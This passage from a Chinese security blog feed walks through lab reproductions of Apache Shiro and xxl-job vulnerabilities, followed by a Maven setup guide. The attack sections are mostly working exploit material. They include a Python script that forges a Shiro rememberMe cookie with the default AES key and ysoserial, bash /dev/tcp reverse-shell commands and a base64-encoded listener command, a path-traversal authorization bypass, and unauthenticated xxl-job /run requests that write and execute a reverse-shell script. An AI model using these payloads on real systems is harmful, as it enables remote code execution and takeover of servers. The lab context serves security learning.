title="构造cookie获取反弹shell"></a>构造cookie获取反弹shell</h3><p>这里就不用集成化高的工具，手工构造一下payload，准备好ysoserial-all.jar，和一个生成payload的python脚本shiro_exp_payload.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-jar.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先准备好反弹shel命令，需要经过runtime编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.174.137/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240811225506692.png" alt="image-20240811225506692"></p><p>启动jrm监听服务器,这里如果反弹不回来可以换一下CommonsCollections2等，2和4我试过不行，换成5行了，估计和版本有关</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240811232222778.png" alt="image-20240811232222778"></p><p>使用python脚本,生成cookie</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python shiro-550.py 192.168.174.137:1099</span><br></pre></td></tr></table></figure><p>python脚本将生成cookie，你将cookie带入http请求中即可反弹shell,这里kali里的python环境没配好，就在外面执行了，然后记得在同目录下也放一个ysoserial-all.jar文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rememberMe=2fgsL9wZRJeFr7EPG/Tr2VRSacRoV96OUGMU25o3RQfJt26P3KCgsuV6BX0gNhLCc9Bh18CkYykBOLUIY71CPNP0qBjp4lLe4zuGzbbQFJptLMP4+3FZb0LLa6hO68Gsa68qiXMRZrU+zA0N9uoLiIkc9dCGM404S642cvGIQO013plK3d6/D5wsA+A2P/arPjL30EjldFik9CBzM3qD/zY+N/YEcWaGvlsLuBJ+6qqE4Rlj5m6SEJANH6VlOV9gW/xdmNE7A6xbxBX4iyFTf6wyc7zbbMvWYL9w8hbBUTP382Vw1rDKXIfnGfpoBs98l7XbX0bpDx8JhUgPm5G5YA+mL2Q+DeqI6qzoMN1NnxhyF6Mi0w8PE6yZd+3jllwYW7vu6+ji5y7Bsozb7j8ycw==</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240811230606153.png" alt="image-20240811230606153"></p><p>监听，抓包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240811232203463.png" alt="image-20240811232203463"></p><p><img src="/../image/image-20240811232147747.png" alt="image-20240811232147747"></p><h1 id="CVE-2020-1957：权限绕过"><a href="#CVE-2020-1957：权限绕过" class="headerlink" title="CVE-2020-1957：权限绕过"></a>CVE-2020-1957：权限绕过</h1><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境直接就是vulhub的docker镜像</p><p>访问服务</p><p><img src="/../image/image-20240813113853254.png" alt="image-20240813113853254"></p><p>抓包</p><p><img src="/../image/image-20240813125425589.png" alt="image-20240813125425589"></p><p>可以看到直接访问admin目录是不允许的，会重定向到其它地方，我们需要想办法绕过</p><p>URL请求过程：</p><ul><li>客户端请求URL: <code>/xxx/..;/admin/</code></li><li>Shrio 内部处理得到校验URL为 <code>/xxxx/..</code>,校验通过</li><li>SpringBoot 处理 <code>/xxx/..;/admin/</code> , 最终请求 <code>/admin/</code>, 成功访问了后台请求。</li></ul><p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p><p><img src="/../image/image-20240813125603904.png" alt="image-20240813125603904"></p>]]></content>
      
      
      
        <tags>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxl-job</title>
      <link href="/2024/08/07/xxl-job/"/>
      <url>/2024/08/07/xxl-job/</url>
      
        <content type="html"><![CDATA[<h1 id="xxl-job"><a href="#xxl-job" class="headerlink" title="xxl-job"></a>xxl-job</h1><h2 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h2><p>在使用之前，需要把maven配置好，可以看我上一篇关于配置maven的文章，配置完成后可以看这篇教程</p><p>使用教程：<a href="https://blog.csdn.net/f2315895270/article/details/104714692">https://blog.csdn.net/f2315895270/article/details/104714692</a></p><p>我也会跟着操作一遍</p><h3 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn compile</span><br></pre></td></tr></table></figure><p><img src="/../image/xxl-job/1.png" alt="image-20240807091924833"></p><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><p>直接用doc下的sql文件即可</p><p><img src="/../image/xxl-job/2.png" alt="image-20240807092056442"></p><p>打开xxl-job-admin模块，在application.properties中进行后台的配置</p><p><img src="/../image/xxl-job/3.png" alt="image-20240807092320507"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240807092522122.png" alt="image-20240807092522122"></p><p>注意在数据库地址哪里加上时区属性，否则乱码</p><p><img src="/../image/xxl-job/4.png" alt="image-20240807092619516"></p><h2 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h2><p>然后我们启动XxlJobAdminApplication类，访问<a href="http://localhost:8080/xxl-job-admin">http://localhost:8080/xxl-job-admin</a> 默认账户admn，密码123456</p><p><img src="/../image/xxl-job/5.png" alt="image-20240807092934369"></p><p><img src="/../image/xxl-job/6.png" alt="image-20240807092918239"></p><p>成功启动了</p><p><img src="/../image/xxl-job/7.png" alt="image-20240807093014559"></p><p>参考文章中说定位到springboot模块下的jobhandler层下面，但我下载的更新后的项目，里面已经不再是jobhandler，可以看项目给的SampleXxlJob改，但代码能力不行，我还是找新教程把</p><p><img src="/../image/xxl-job/8.png" alt="image-20240807111826397"></p><p>换成了这个，我后续跟的是另一个教程java<a href="https://blog.csdn.net/2303_79633394/article/details/139549331?ops_request_misc=&request_id=&biz_id=102&utm_term=xxl-job%E4%BD%BF%E7%94%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-139549331.142%5Ev100%5Epc_search_result_base8&spm=1018.2226.3001.4187">定时任务框架xxl-job(使用、总结)</a>，按照他的测试代码试了试，还发现，可以用docker拉这个项目，但我觉得可能就不是很好修改了，这里我们就不用他的执行器了，用默认的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.executor.service.jobhandler;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.RandomUtil;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.context.XxlJobHelper;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.annotation.XxlJob;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 任务处理器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JobHandler</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//定义一组任务</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Integer&gt; dataList = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 普通任务</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@XxlJob(&quot;firstJob&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">firstJob</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;firstJob执行了.... &quot;</span> + LocalDateTime.now());</span><br><span class="line">        <span class="keyword">for</span> (Integer data : dataList) &#123;</span><br><span class="line">            XxlJobHelper.log(<span class="string">&quot;data= &#123;&#125;&quot;</span>, data); <span class="comment">//写日志到xxl-job中</span></span><br><span class="line">            <span class="comment">//每次执行任务后，随机暂停一段时间</span></span><br><span class="line">            Thread.sleep(RandomUtil.randomInt(<span class="number">100</span>, <span class="number">500</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;firstJob执行结束了.... &quot;</span> + LocalDateTime.now());</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><p>测试的时候会少一个依赖，hutool的，本地仓库是有，我们给他加进去就行了</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.7.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后更新一下环境就行了，但当时也不知道哪一个成的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn clean insall</span><br></pre></td></tr></table></figure><p>然后还点了一下maven重载，回归正题，在任务管理里面新增任务</p><p><img src="/../image/xxl-job/9.png" alt="image-20240807112854359"></p><p>编写完成后，重启服务，在任务管理中创建任务：</p><p><img src="/../image/xxl-job/10.png" alt="image-20240807120240234"></p><p>这个新增参数和之前好像也有变化，稍微调了调，让他看起来和攻略里差不多，然后记得启动执行器XxlJobExecutorApplication</p><p><img src="/../image/xxl-job/11.png" alt="image-20240807124553451"></p><p>也是成功执行了，后续的cron控制定时任务等其它操作，可以继续看这个*<a href="https://blog.csdn.net/2303_79633394/article/details/139549331?ops_request_misc=&request_id=&biz_id=102&utm_term=xxl-job%E4%BD%BF%E7%94%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-139549331.142%5Ev100%5Epc_search_result_base8&spm=1018.2226.3001.4187">攻略</a>*</p><h1 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h1><p>在docker里也有一个unacc的漏洞，我们先测试这个</p><h3 id="uacc"><a href="#uacc" class="headerlink" title="uacc"></a>uacc</h3><ol><li>环境搭建</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><ol start="2"><li>查看服务是否启动</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.174.137</span><br></pre></td></tr></table></figure><p><img src="/../image/xxl-job/12.png" alt="image-20240807223359701"></p><p>可以看到8080是admin服务，9999是exector端，我们访问9999端口</p><p><img src="/../image/xxl-job/13.png" alt="image-20240807223434680"></p><p>看到这个就是服务启动成功了</p><ol start="3"><li>poc测试</li></ol><p>访问<a href="http://localhost:9999/run%E6%8A%93%E5%8C%85">http://localhost:9999/run抓包</a></p><p><img src="/../image/xxl-job/14.png" alt="image-20240807224749550"></p><p>修改请求方式为<code>POST</code> ，并写入exp，然后发送请求</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;jobId&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorHandler&quot;</span><span class="punctuation">:</span> <span class="string">&quot;demoJobHandler&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorParams&quot;</span><span class="punctuation">:</span> <span class="string">&quot;demoJobHandler&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorBlockStrategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;COVER_EARLY&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorTimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;logId&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;logDateTime&quot;</span><span class="punctuation">:</span> <span class="number">1586629003729</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;glueType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GLUE_SHELL&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;glueSource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.174.160/9999 0&gt;&amp;1&#x27; &gt; /tmp/1.sh&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;glueUpdatetime&quot;</span><span class="punctuation">:</span> <span class="number">1586699003758</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;broadcastIndex&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;broadcastTotal&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/xxl-job/15.png" alt="image-20240807230548050"></p><p>这样子是先创建了一个shell脚本，等会我们执行它即可，现在在本机开启监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure><p>然后再发一个赋予权限和一个执行shell脚本的exp</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;jobId&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorHandler&quot;</span><span class="punctuation">:</span> <span class="string">&quot;demoJobHandler&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorParams&quot;</span><span class="punctuation">:</span> <span class="string">&quot;demoJobHandler&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorBlockStrategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;COVER_EARLY&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorTimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;logId&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;logDateTime&quot;</span><span class="punctuation">:</span> <span class="number">1586629003729</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;glueType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GLUE_SHELL&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;glueSource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chmod +x /tmp/1.sh&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;glueUpdatetime&quot;</span><span class="punctuation">:</span> <span class="number">1586699003758</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;broadcastIndex&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;broadcastTotal&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/xxl-job/16.png" alt="image-20240807230819254"></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;jobId&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorHandler&quot;</span><span class="punctuation">:</span> <span class="string">&quot;demoJobHandler&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorParams&quot;</span><span class="punctuation">:</span> <span class="string">&quot;demoJobHandler&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorBlockStrategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;COVER_EARLY&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;executorTimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;logId&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;logDateTime&quot;</span><span class="punctuation">:</span> <span class="number">1586629003729</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;glueType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GLUE_SHELL&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;glueSource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/bin/bash /tmp/1.sh&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;glueUpdatetime&quot;</span><span class="punctuation">:</span> <span class="number">1586699003758</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;broadcastIndex&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;broadcastTotal&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/xxl-job/17.png" alt="image-20240807230912173"></p><p>不懂怎么不行，文件倒是创建了，在容器里测试了下，可以返回，但发包就不行</p><p><img src="/../image/xxl-job/18.png" alt="image-20240807231627257"></p><p>创建个2.sh，给他弹到靶机去试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.174.137/8888 0&gt;&amp;1&#x27; &gt; /tmp/2.sh</span><br></pre></td></tr></table></figure><p>不懂怎么回事，在里面弹就行，外面最多到赋予权限，试了下删除点东西，原来是包的东西太多了</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /run HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.174</span><span class="number">.137</span><span class="punctuation">:</span><span class="number">9999</span></span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv<span class="punctuation">:</span><span class="number">128.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">128.0</span></span><br><span class="line">Accept<span class="punctuation">:</span> text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml;q=<span class="number">0.9</span><span class="punctuation">,</span>image/avif<span class="punctuation">,</span>image/webp<span class="punctuation">,</span>image/png<span class="punctuation">,</span>image/svg+xml<span class="punctuation">,</span>*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 366</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;jobId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorTimeout&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;logId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;logDateTime&quot;: 1586629003729,</span></span><br><span class="line"><span class="comment">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueSource&quot;: &quot;/bin/bash /tmp/1.sh&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueUpdatetime&quot;: 1586699003758,</span></span><br><span class="line"><span class="comment">  &quot;broadcastIndex&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;broadcastTotal&quot;: 0</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>删掉一些东西就行了</p><p><img src="/../image/xxl-job/19.png" alt="image-20240808135237270"></p>]]></content>
      
      
      
        <tags>
            
            <tag> xxl-job </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven环境配置</title>
      <link href="/2024/08/07/Maven%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/08/07/Maven%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h1><p>环境变量的配置：<a href="https://blog.csdn.net/u012660464/article/details/114113349">https://blog.csdn.net/u012660464/article/details/114113349</a></p><h2 id="下载maven"><a href="#下载maven" class="headerlink" title="下载maven"></a>下载maven</h2><p><a href="https://maven.apache.org/download.cgi">https://maven.apache.org/download.cgi</a></p><p><img src="/../image/image-20240806223129672.png" alt="image-20240806223129672"></p><h2 id="Maven软件的安装"><a href="#Maven软件的安装" class="headerlink" title="Maven软件的安装"></a>Maven软件的安装</h2><p>Maven 下载后，将 Maven 解压到一个没有中文没有空格的路径下，比如D:\extools\apache-maven-3.9.8下面。 解压D:\extools\apache-maven-3.9.8后目录结构如下：</p><p><img src="/../image/image-20240806223233138.png" alt="image-20240806223233138"></p><ol><li>bin:存放了 maven 的命令</li><li>boot:存放了一些 maven 本身的引导程序，如类加载器等</li><li>conf:存放了 maven 的一些配置文件，如 setting.xml 文件</li><li>lib:存放了 maven 本身运行所需的一些 jar 包</li></ol><h2 id="环境变量配置"><a href="#环境变量配置" class="headerlink" title="环境变量配置"></a>环境变量配置</h2><p>1.配置 MAVEN_HOME ，变量值就是你的 maven 安装的路径（bin 目录之前一级目录）</p><p><img src="/../image/image-20240806223452765.png" alt="image-20240806223452765"></p><p>2.将MAVEN_HOME 添加到Path系统变量</p><p><img src="/../image/image-20240806223524333.png" alt="image-20240806223524333"></p><h2 id="Maven-软件版本测试"><a href="#Maven-软件版本测试" class="headerlink" title="Maven 软件版本测试"></a>Maven 软件版本测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn -v</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240806223552256.png" alt="image-20240806223552256"></p><h2 id="Maven-仓库"><a href="#Maven-仓库" class="headerlink" title="Maven 仓库"></a>Maven 仓库</h2><ol><li>Maven的仓库分类<br>本地仓库: 位于自己计算机中的仓库, 用来存储从远程仓库或中央仓库下载的插件和 jar 包，<br>远程仓库: 需要联网才可以使用的仓库，阿里提供了一个免费的maven 远程仓库。<br>中央仓库: 在 maven 软件中内置一个远程仓库地址 <a href="http://repo1.maven.org/maven2">http://repo1.maven.org/maven2</a> ，它是中 央仓库，服务于整个互联网，它是由 Maven 团队自己维护，里面存储了非常全的 jar 包，它包 含了世界上大部分流行的开源项目构件</li></ol><p>原文链接：<a href="https://blog.csdn.net/u012660464/article/details/114113349">https://blog.csdn.net/u012660464/article/details/114113349</a></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/5c1c81c8f901a7f8a9d912eabc98dbbf.jpeg" alt="在这里插入图片描述"></p><h3 id="Maven-本地仓库的配置"><a href="#Maven-本地仓库的配置" class="headerlink" title="Maven 本地仓库的配置"></a>Maven 本地仓库的配置</h3><ol><li>maven仓库默认是在 C盘 .m2 目录下,我们不要将仓库放在C盘,所以这里要重新配置一下</li></ol><p>这里就不提供本地仓库了，担心版本问题，我就把自己原来的仓库移个位置</p><p>（注意最好放在没有中文及空格的目录下），我这里就直接把整个.m2文件移动到D:\extools</p><ol start="2"><li>在maven安装目录中,进入 conf文件夹, 可以看到一个 settings.xml 文件中, 我们在这个文件中, 进行本地仓库的配置</li></ol><p><img src="/../image/image-20240806224511335.png" alt="image-20240806224511335"></p><p><img src="/../image/image-20240806224700717.png" alt="image-20240806224700717"></p><ol start="3"><li>配置阿里云远程仓库</li></ol><p>打开 settings.xml,找到 标签 , 下面的内容复制到 中 即可</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--setting.xml中添加如下配置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- 中心仓库的 mirror(镜像) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>    </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus aliyun<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- aliyun仓库地址 以后所有要指向中心仓库的请求，都会指向aliyun仓库--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240806224912908.png" alt="image-20240806224912908"></p><h2 id="在Idea中关联Maven"><a href="#在Idea中关联Maven" class="headerlink" title="在Idea中关联Maven"></a>在Idea中关联Maven</h2><p>详细教程：<a href="https://blog.csdn.net/qq_43410878/article/details/123812267">https://blog.csdn.net/qq_43410878/article/details/123812267</a></p><p>在idea中关联本地安装的maven，后续就可以通过idea使用maven来管理项目</p><p>Maven 工程的目录结构</p><p>作为一个 maven 工程，它的 src目录和 pom.xml 是必备的。<br>进入 src目录后，我们发现它里面的目录结构如下：</p><ul><li><p>src&#x2F;main&#x2F;java —— 存放项目的.java 文件</p></li><li><p>src&#x2F;main&#x2F;resources —— 存放项目资源文件，如 spring, hibernate 配置文件</p></li><li><p>src&#x2F;test&#x2F;java —— 存放所有单元测试.java 文件，如 JUnit 测试类</p></li><li><p>src&#x2F;test&#x2F;resources —— 测试资源文件</p></li><li><p>target —— 项目输出位置，编译后的class 文件会输出到此目录</p></li><li><p>pom.xml——maven 项目核心配置文件</p></li></ul><p>注意：如果是普通的 java 项目，那么就没有webapp 目录。</p><p>原文链接：<a href="https://blog.csdn.net/qq_43410878/article/details/123812267">https://blog.csdn.net/qq_43410878/article/details/123812267</a></p><p><img src="/../image/image-20240806225030929.png" 